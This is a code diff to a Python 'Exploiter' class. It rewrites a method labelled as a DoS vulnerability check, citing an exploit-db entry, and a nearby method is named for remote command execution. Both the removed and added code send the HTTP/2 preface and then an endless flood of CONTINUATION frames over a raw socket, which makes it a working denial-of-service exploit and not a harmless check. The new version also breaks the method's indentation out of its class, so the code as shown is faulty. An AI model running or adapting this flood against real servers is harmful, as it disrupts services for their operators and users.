@@ -125,22 +125,50 @@ class Exploiter:
     # DoS Attack Check
     # Source: https://www.exploit-db.com/exploits/40909
     def check_dosattack(self):
-        print(f"[*] Checking for DoS vulnerability on {self.url}")
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((self.url, self.port))
-            s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
-            SETTINGS = struct.pack('3B', 0x00, 0x00, 0x00) + struct.pack('B', 0x04) + struct.pack('B', 0x00) + struct.pack('>I', 0x00000000)
-            s.sendall(SETTINGS)
-            HEADER_BLOCK_FRAME = b'\x82\x84\x86\x41\x86\xa0\xe4\x1d\x13\x9d\x09\x7a\x88\x25\xb6\x50\xc3\xab\xb6\x15\xc1\x53\x03\x2a\x2f\x2a\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76'
-            HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:] + struct.pack('B', 0x01) + struct.pack('B', 0x00) + struct.pack('>I', 0x00000001)
+    print(f"[*] Checking for DoS vulnerability on {self.url}")
+    try:
+        # Initialize socket
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(self.timeout)
+        s.connect((self.url, self.port))
+
+        # Send initial request to start HTTP/2
+        s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
+
+        # Send SETTINGS frame
+        SETTINGS = struct.pack('3B', 0x00, 0x00, 0x00)  # Length
+        SETTINGS += struct.pack('B', 0x04)  # Type
+        SETTINGS += struct.pack('B', 0x00)
+        SETTINGS += struct.pack('>I', 0x00000000)
+        s.sendall(SETTINGS)
+
+        # Send HEADER block frame
+        HEADER_BLOCK_FRAME = b'\x82\x84\x86\x41\x86\xa0\xe4\x1d\x13\x9d\x09\x7a\x88\x25\xb6\x50\xc3\xab\xb6\x15\xc1\x53\x03\x2a\x2f\x2a\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76'
+        HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:]  # Length
+        HEADERS += struct.pack('B', 0x01)  # Type
+        HEADERS += struct.pack('B', 0x00)  # Flags
+        HEADERS += struct.pack('>I', 0x00000001)  # Stream ID
+        s.sendall(HEADERS + HEADER_BLOCK_FRAME)
+
+        # Send CONTINUATION frames repeatedly
+        while True:
+            HEADER_BLOCK_FRAME = b'\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76'
+            HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:]  # Length
+            HEADERS += struct.pack('B', 0x09)  # Type
+            HEADERS += struct.pack('B', 0x01)  # Flags
+            HEADERS += struct.pack('>I', 0x00000001)  # Stream ID
             s.sendall(HEADERS + HEADER_BLOCK_FRAME)
-            while True:
-                HEADER_BLOCK_FRAME = b'\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76'
-                HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:] + struct.pack('B', 0x09) + struct.pack('B', 0x01) + struct.pack('>I', 0x00000001)
-                s.sendall(HEADERS + HEADER_BLOCK_FRAME)
-        except Exception as e:
-            print(f"[!] Error: {e}")
+
+    except socket.gaierror as e:
+        print(f"[!] Address-related error connecting to server: {e}")
+    except socket.timeout as e:
+        print(f"[!] Connection timed out: {e}")
+    except socket.error as e:
+        print(f"[!] Socket error: {e}")
+    except Exception as e:
+        print(f"[!] General error: {e}")
+    finally:
+        s.close()
 
     # Execute remote commands if RCE is enabled
     def execute_rce(self):
